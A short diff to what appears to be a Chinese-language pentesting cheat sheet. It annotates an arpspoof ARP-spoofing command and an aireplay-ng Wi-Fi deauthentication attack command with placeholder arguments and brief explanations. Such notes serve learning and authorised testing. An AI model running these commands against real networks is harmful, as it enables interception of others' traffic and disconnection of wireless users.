@@ -114,7 +114,10 @@ echo 0 > /proc/sys/net/ipv4/ip_forward
 
 arp欺骗，需要指定相关网卡。
 ```bash
-arpspoof -i eth0 -t target -r host
+arpspoof -i <eth0> -t <target> <host>
+# -i 指定特定的网卡
+# -t 目标IP
+# host 网关IP
 ```
 
 
@@ -169,6 +172,7 @@ airodump-ng -c <ch> -w /path/to/file --bbsid <bbsid> wlan0mon
 使用aireplay-ng 进行解除认证攻击模式
 
 ```bash
-aireplay-ng -0 0 -a <AP MAC address> -c <client address> wlan0mon
+aireplay-ng -0 0 -a <AP address> -c <client address> wlan0mon
+# 指定AP和客户端的地址，将其进行破解
 ```
 
